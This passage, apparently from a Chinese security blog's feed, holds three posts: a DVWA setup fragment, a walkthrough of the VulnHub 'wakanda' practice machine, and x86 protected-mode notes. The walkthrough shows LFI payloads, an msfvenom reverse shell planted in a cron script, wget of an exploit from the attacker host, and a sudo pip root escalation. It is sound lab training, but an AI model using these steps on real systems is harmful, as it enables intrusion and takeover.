&apos;127.0.0.1&apos;;</span><br><span class="line">$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_user&apos; ]     = &apos;root&apos;;</span><br><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;;</span><br></pre></td></tr></table></figure><p> 修改为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  $_DVWA[ &apos;db_server&apos; ]   = &apos;localhost&apos;;</span><br><span class="line">$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_user&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>重启<code>lampp</code>服务即可</p><p> <img src="/images/baji/dvwa/8.png" alt="8.png"></p></li></ol><p>配置全部结束，即可登陆，默认用户名<code>admin</code>，密码<code>password</code></p><p><img src="/images/baji/dvwa/9.png" alt="9.png"></p><h2 id="设置环境开机自启"><a href="#设置环境开机自启" class="headerlink" title="设置环境开机自启"></a>设置环境开机自启</h2><ol><li><p>创建启动文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /lib/systemd/system/</span><br><span class="line">vi /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure><p> 文件内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]# 服务的说明</span><br><span class="line">Description=lampp# 描述服务</span><br><span class="line">After=network.target# 描述服务类别</span><br><span class="line">      </span><br><span class="line">[Service]# 服务运行参数的设置</span><br><span class="line">Type=forking# 后台运行的形式</span><br><span class="line">ExecStart=/opt/lampp/lampp start# 服务的具体运行命令</span><br><span class="line">ExecReload=/opt/lampp/lampp restart# 重启命令</span><br><span class="line">ExecStop=/opt/lampp/lampp  stop# 停止命令</span><br><span class="line">PrivateTmp=true  # 表示给服务分配独立的临时空间</span><br><span class="line">      </span><br><span class="line">[Install]# 服务安装的相关设置，可设置为多用户</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li><li><p>设置启动文件权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 754 /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure></li><li><p>设置开机自启</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable lampp.service</span><br></pre></td></tr></table></figure></li><li><p>其他相关命令</p><ol><li><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start lampp.service</span><br></pre></td></tr></table></figure></li><li><p>取消开机自启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable lampp.service</span><br></pre></td></tr></table></figure></li><li><p>查看服务状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status lampp.service</span><br></pre></td></tr></table></figure></li><li><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart lampp.service</span><br></pre></td></tr></table></figure></li><li><p>查看所有已启动的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --type=service</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>wakanda靶机</title>
    <link href="http://yoursite.com/2019/05/03/wakanda%E9%9D%B6%E6%9C%BA/"/>
    <id>http://yoursite.com/2019/05/03/wakanda靶机/</id>
    <published>2019-05-03T05:05:00.000Z</published>
    <updated>2020-02-24T04:21:21.841Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>下载<code>wakanda</code>虚拟机<code>.ova</code>文件</p><p>下载地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/#download" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/#download</a></p><p>导入 <code>VirtualBox</code></p><hr><h1 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h1><p>攻击机：<code>kali</code></p><p>被攻击机：<code>wakanda</code></p><p>网络模式：桥接</p><h2 id="获取靶机IP"><a href="#获取靶机IP" class="headerlink" title="获取靶机IP"></a>获取靶机IP</h2><ol><li><p>查看<code>kali</code>攻击机<code>IP</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/111.png" alt="1.png"></p></li><li><p>使用<code>netdiscover</code>工具进行网络扫描，找到靶机<code>IP</code>地址</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/2.png" alt="2.png"></p></li></ol><h2 id="枚举和初步搜索信息"><a href="#枚举和初步搜索信息" class="headerlink" title="枚举和初步搜索信息"></a>枚举和初步搜索信息</h2><ol><li><p>使用<code>nmap</code>进行全端口扫描</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.43.57</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/3.png" alt="3.png"></p><p> 靶机开放80(<code>HTTP</code>)、111(<code>RPC</code>)、3333(<code>SSH</code>)、57050(<code>RPC</code>)端口</p></li><li><p>访问80端口</p><p> <img src="/images/baji/wakanda/4.png" alt="4.png"></p><p> 无有用信息</p></li><li><p>使用<code>dirb</code>工具来进行目录遍历</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.43.57</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/5.png" alt="5.png"></p></li><li><p>访问扫描到的目录</p><p> <code>/admin</code>和<code>/backup</code>等目录，大小为0。</p><p> 查看<code>index</code>页面源码,在页面注释中发现了<code>lang</code>参数</p><p> <img src="/images/baji/wakanda/6.png" alt="6.png"></p><p> 在<code>?lang=fr</code>中，<code>lang</code>表示可切换的网站语言，<code>fr</code>表示法语。我们尝试在<code>HTTP URL</code>中添加这个参数，切换语言为法语</p><p> <img src="/images/baji/wakanda/7.png" alt="7.png"></p></li></ol><h2 id="利用LFI-本地文件包含漏洞-读取源码"><a href="#利用LFI-本地文件包含漏洞-读取源码" class="headerlink" title="利用LFI(本地文件包含漏洞)读取源码"></a>利用LFI(本地文件包含漏洞)读取源码</h2><ol><li><p>使用<code>PHP</code>伪协议</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.57/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/8.png" alt="8.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=</span><br></pre></td></tr></table></figure></li><li><p>对源码进行<code>base64</code>解码</p><p> <img src="/images/baji/wakanda/9.png" alt="9.png"></p><p> 获取到密码<code>Niamey4Ever227!!!</code></p><p> 网站所有者为<code>mamadou</code></p><p> <img src="/images/baji/wakanda/10.png" alt="10.png"></p></li></ol><h2 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h2><ol><li><p>尝试使用此账号密码(<code>mamadou</code>、<code>Niamey4Ever227!!!</code>)登陆</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mamadou@192.168.43.57 -p 3333</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/11.png" alt="11.png"></p><p> 得到了一个<code>python 2.7.9</code>命令提示符界面</p></li><li><p>使用<code>python</code>模块来进入系统的<code>bash shell</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/12.png" alt="12.png"></p></li><li><p>查看<code>mamadou</code>用户的家目录，读取<code>flag1.txt</code></p><p> <img src="/images/baji/wakanda/13.png" alt="13.png"></p></li></ol><h2 id="利用系统中的其他用户"><a href="#利用系统中的其他用户" class="headerlink" title="利用系统中的其他用户"></a>利用系统中的其他用户</h2><ol><li><p>查看系统中其他用户</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/14.png" alt="14.png"></p><p> 发现<code>devops</code>用户，其家目录存在<code>flag2.txt</code>，但无访问权限</p><p> <img src="/images/baji/wakanda/15.png" alt="15.png"></p></li><li><p>目录遍历</p><p> <code>/tmp</code>存在属主是<code>devops</code>用户的<code>test</code>文件</p><p> <img src="/images/baji/wakanda/1666.png" alt="16.png"></p><p> 当前系统时间</p><p> <img src="/images/baji/wakanda/20.png" alt="20.png"></p><p> 相差时间较短，说明存在定时执行文件，定时修改<code>/tmp/test</code>文件内容</p></li><li><p>寻找定时任务文件</p><p> 查找属主是<code>devops</code>用户的文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user devops 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/177.png" alt="17.png"></p><p> 发现<code>.py</code>文件</p><p> <img src="/images/baji/wakanda/18.png" alt="18.png"></p><p> 且权限为所有人可写入</p></li></ol><h2 id="建立反向shell"><a href="#建立反向shell" class="headerlink" title="建立反向shell"></a>建立反向shell</h2><p><code>/srv/.antivirus.py</code>中的内容为</p><p><img src="/images/baji/wakanda/19.png" alt="19.png"></p><p><code>/srv/.antivirus.py</code>的作用是打开<code>/tmp/test</code>文件，并向其写入<code>test</code></p><p>可以利用这个脚本，可以执行<code>shellcode</code></p><ol><li><p>生成<code>shellcode</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.43.250 lport=4444</span><br></pre></td></tr></table></figure></li><li><p>将<code>shellcode</code>写入<code>.py</code>文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /srv/.antivirus.py</span><br></pre></td></tr></table></figure><p><img src="/images/baji/wakanda/21.png" alt="21.png"></p></li><li><p>监听端口，等待反弹<code>shell</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure></li><li><p>获取<code>devops</code>用户<code>shell</code></p><p> 等待几分钟后，系统定时执行<code>/srv/.antivirus.py</code>文件，执行<code>shellcode</code>,获取反弹<code>shell</code></p><p> <img src="/images/baji/wakanda/22.png" alt="22.png"></p></li><li><p>读取<code>flag2.txt</code></p><p> <img src="/images/baji/wakanda/23.png" alt="23.png"></p></li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li><p>查看用户<code>devops</code>的<code>sudo</code>权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/wakanda/24.png" alt="24.png"></p><p> 发现用户<code>devops</code>可无密码执行的<code>sudo</code>命令只有<code>/usr/bin/pip</code></p></li><li><p>利用<code>pip</code>漏洞进行提权</p><ol><li><p>攻击机下载<code>exp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0x00-0x00/FakePip.git</span><br></pre></td></tr></table></figure><p><img src="/images/baji/wakanda/255.png" alt="25.png"></p></li><li><p>攻击机修改<code>exp</code></p><p><img src="/images/baji/wakanda/26.png" alt="26.png"></p><p>更改脚本中<code>shell</code>的反弹地址为<code>kali</code>的地址</p></li><li><p>攻击机利用<code>python</code>建立<code>SimpleHTTPServer</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure><p><img src="/images/baji/wakanda/277.png" alt="27.png"></p><p>在<code>kali</code>当前目录上运行了一个简易的<code>HTTP</code>服务器，在靶机上就可从这个<code>HTTP</code>服务器下载<code>setup.py</code>脚本</p></li><li><p>被攻击机下载提权脚本</p><p>利用用户<code>devops</code>，下载脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir fakepip</span><br><span class="line">cd fakepip</span><br><span class="line">wget http://192.168.43.250:8888/setup.py</span><br></pre></td></tr></table></figure><p><img src="/images/baji/wakanda/28.png" alt="28.png"></p></li><li><p><code>kali</code>中监听13372端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 13372</span><br></pre></td></tr></table></figure></li><li><p>攻击机执行<code>exp</code></p><p>利用用户<code>devops</code>，执行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure><p><img src="/images/baji/wakanda/29.png" alt="29.png"></p></li><li><p><code>kali</code>获取反弹<code>shell</code></p><p><img src="/images/baji/wakanda/30.png" alt="30.png"></p><p>此为被攻击机<code>root</code>账户</p></li></ol></li></ol><h2 id="查看最终flag"><a href="#查看最终flag" class="headerlink" title="查看最终flag"></a>查看最终flag</h2><p><img src="/images/baji/wakanda/31.png" alt="31.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="wakanda" scheme="http://yoursite.com/tags/wakanda/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编语言-从实模式到保护模式-32位Intel微处理器编程架构</title>
    <link href="http://yoursite.com/2019/05/01/x86%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-32%E4%BD%8DIntel%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B%E6%9E%B6%E6%9E%84/"/>
    <id>http://yoursite.com/2019/05/01/x86汇编语言-从实模式到保护模式-32位Intel微处理器编程架构/</id>
    <published>2019-05-01T07:57:00.000Z</published>
    <updated>2019-05-01T19:52:40.556Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>所谓处理器架构，或者处理其编程架构，是指一整套的硬件结构，以及与之相适应的工作状态</p><p><code>Intel</code>32微处理器架构简称<code>IA-32</code>,以8086处理器为基础发展而来</p><p>8086有20根地址线，可寻址<code>1MB</code>内存。内部寄存器16位，无法在程序中访问整个<code>1MB</code>内存，所以，它是第一款支持内存分段模型的处理器。8086处理器只有一种工作模式，即实模式</p><p>32位的处理器有32根地址线，数据线的数量是32根或64根。它可以访问2^32，即<code>4GB</code>的内存，每次可读写连续的4字节或8字节，称为双字或4字访问</p><h1 id="IA-32架构的基本执行环境"><a href="#IA-32架构的基本执行环境" class="headerlink" title="IA-32架构的基本执行环境"></a>IA-32架构的基本执行环境</h1><h2 id="寄存器的扩展"><a href="#寄存器的扩展" class="headerlink" title="寄存器的扩展"></a>寄存器的扩展</h2><p>在16位处理器内，有8个通用寄存器<code>AX</code>、<code>BX</code>、<code>CX</code>、<code>DX</code>、<code>SI</code>、<code>DI</code>、<code>BP</code>和<code>SP</code>，其中，前4个还可以拆分成两个独立的8位寄存器使用，即<code>AH</code>、<code>AL</code>、<code>BH</code>、<code>BL</code>、<code>CH</code>、<code>CL</code>、<code>DH</code>和<code>DL</code></p><p>32位处理器在16位处理器的基础上，扩展了这8个通用寄存器的长度</p><p><img src="/images/x86huibianyuyan/10/1.png" alt="1.png"></p><p><img src="/images/x86huibianyuyan/10/2.png" alt="2.png"></p><p><img src="/images/x86huibianyuyan/10/3.png" alt="3.png"></p><p><img src="/images/x86huibianyuyan/10/4.png" alt="4.png"></p><p><img src="/images/x86huibianyuyan/10/5.png" alt="5.png"></p><p><img src="/images/x86huibianyuyan/10/6.png" alt="6.png"></p><p><img src="/images/x86huibianyuyan/10/7.png" alt="7.png"></p><p><img src="/images/x86huibianyuyan/10/8.png" alt="8.png"></p><p>为了在汇编语言中使用经过扩展的寄存器，需要给它们重命名，分别为<code>EAX</code>、<code>EBX</code>、<code>ECX</code>、<code>EDX</code>、<code>ESI</code>、<code>EDI</code>、<code>ESP</code>和<code>EBP</code>。可以在程序中使用这些寄存器，即使在实模式中</p><p><strong>指令的源操作数与目的操作数必须具有相同的长度，个别特殊用途的指令除外</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,f0000005h</span><br><span class="line">mov ecx,eax</span><br><span class="line">add edx,ecx</span><br><span class="line">mov eax,f5h;EAX&lt;-000000f5h</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,cx;错误的汇编指令，位数不符</span><br></pre></td></tr></table></figure><p>32位通用寄存器的高16位是不可独立使用的，但低16位保持同16位处理器的兼容性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,02h</span><br><span class="line">mov al,03h</span><br><span class="line">add ax,si</span><br></pre></td></tr></table></figure><p>32位处理器有自己的32位工作模式。在32位保护模式下，可以完全、充分的发挥处理器的性能，同时，处理器可以使用它全部的32根地址线，能够访问<code>4GB</code>的内存</p><p>32位处理器扩展了<code>IP</code>，使之达到32位，即<code>EIP</code></p><p>当它工作在16位模式下，使用16位<code>IP</code>；工作在32位模式下，使用全部的32位<code>EIP</code></p><p><img src="/images/x86huibianyuyan/10/9.png" alt="9.png"></p><p>16位处理器中，标志寄存器<code>FLAGS</code>为16位，在32位处理器中，扩展到32位，低16位和原先保持一致</p><p><img src="/images/x86huibianyuyan/10/10.png" alt="10.png"></p><p>在32位模式下，对内存的访问从理论上来说不再需要分段，因其有32根地址线，可以自由访问<code>4GB</code>内存的任何一个内存位置。但<code>IA-32</code>架构的处理器是基于分段模型的，则<strong>32位处理器依然需要以段为单位访问内存，只分一个段，段的基地址为<code>00000000h</code>，段的长度为<code>4GB</code>。在这种情况下，可视为不分段，即平坦模型</strong></p><p>在16位模式下，一个程序可以自由的访问不属于它的内存位置，甚至可以对那些地方的内容进行修改，这是不安全的。在32位模式下，处理器要求在加载程序时，先定义该程序所拥有的段，然后允许使用这些段。定义段时，除了基地址外，还附加了段界限、特权级别、类型的等属性。当程序访问一个段时，处理器将用固件实施各种检查工作，以防止对内存的违规访问</p><p>在32位模式下。传统的段寄存器，如<code>CS</code>、<code>SS</code>、<code>DS</code>、<code>ES</code>，保存的不再是16位段地址，而是段的选择子，即用于选择所要访问的段，它的新名称为<strong>段选择器</strong>。除段选择器外，每个段寄存器还包括一个64位的不可见部分，称为<strong>描述符高速缓存器</strong>，里面有段的基地址和各种访问属性，这部分内容不可见，由处理器自动使用</p><p><img src="/images/x86huibianyuyan/10/11.png" alt="11.png"></p><p>32位处理器增加了两个额外的段寄存器<code>FS</code>和<code>GS</code></p><h2 id="基本的工作模式"><a href="#基本的工作模式" class="headerlink" title="基本的工作模式"></a>基本的工作模式</h2><p>8086具有16位的段寄存器、指令寄存器和通用寄存器，称为16位的处理器。尽管8086可以访问<code>1MB</code>的内存，但只能分段进行，而且由于只使用16位的段内偏移量，故段的长度最大只能是<code>64KB</code></p><p>80286处理器段寄存器16位，而且只能使用16位的偏移地址，在实模式下只能使用<code>64KB</code>的段；尽管它有24根地址线，理论上可以访问2^24，即<code>16MB</code>的内存，但依然只能分为多个段来进行</p><p>80286处理器第一次提出了保护模式的概念，在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部的<code>16MB</code>内存</p><p>80386处理器的寄存器是32位的，而且拥有32根地址线，可以访问2^32，即<code>4GB</code>的内存</p><p>在保护模式下，所有的32位处理器都可以访问多达<code>4GB</code>的内存，它们可以工作在分段模式下，每个段的基地址为32位的，段内偏移为32位的，因此，段的长度不受限制。32位保护模式兼容80286的16位保护模式</p><p>32位处理器提供虚拟8086模式(<code>V86</code>模式)，在这种模式下，<code>IA-32</code>处理器被模拟成多个8086处理器并行工作。<code>V86</code>模式是保护模式的一种，可以在保护模式下执行多个8086程序</p><h2 id="线性地址"><a href="#线性地址" class="headerlink" title="线性地址"></a>线性地址</h2><p><code>IA-32</code>处理器编程时，访问内存时，需提供段地址和偏移量</p><p>段的管理由处理器的段部件负责进行，段部件将段地址和偏移地址相加，得到访问内存的地址，一般来说，段部件产生的地址就是物理地址</p><p><code>IA-32</code>处理器在多任务环境下，对程序内存进行分配和回收，会产生内存碎片，<code>IA-32</code>处理器支持分页功能，分页功能将物理内存空间划分为逻辑上的页。页的大小是固定的，一般为<code>4KB</code>，通过分页，可以简化内存管理</p><p>当分页功能开启时，段部件产生的地址就不再是物理地址了，而是线性地址，线性地址要经过页部件转换后，才是物理地址</p><p><img src="/images/x86huibianyuyan/10/12.png" alt="12.png"></p><p>线性地址的概念用来描述任务的地址空间。<code>IA-32</code>处理器的每个任务都拥有<code>4GB</code>的虚拟内存空间，是一段长<code>4GB</code>的平坦空间，叫做线性地址空间。相应的，由段部件产生的地址，就对应着线性地址空间上的每一个点，就是线性地址</p><hr><h1 id="现代处理器的结构和特点"><a href="#现代处理器的结构和特点" class="headerlink" title="现代处理器的结构和特点"></a>现代处理器的结构和特点</h1><h2 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h2><p>8086时代，处理器就存在指令预取队列。当指令执行时，若总线空闲(无访问内存的操作)，就可以在指令执行的同时预取指令并提前译码，可以大大加快程序的执行速度</p><p>为提高处理器的执行效率和速度，可以将一条指令的执行过程分解为若干个细小的步骤，并分配给相应的单元来完成。各个单元的执行是独立的、并行的。如此一来，各个步骤的执行在时间上就会重叠起来，这种执行指令的方法就是<strong>流水线技术</strong></p><p>3级流水线：</p><p><img src="/images/x86huibianyuyan/10/13.png" alt="13.png"></p><p>一般来说，流水线的效率受执行时间最长的那一级的限制<br>，要缩短各级的执行时间，就必须让每一级的任务减少，与此同时，需要将一些复杂的任务再进行分解</p><h2 id="高速缓存"><a href="#高速缓存" class="headerlink" 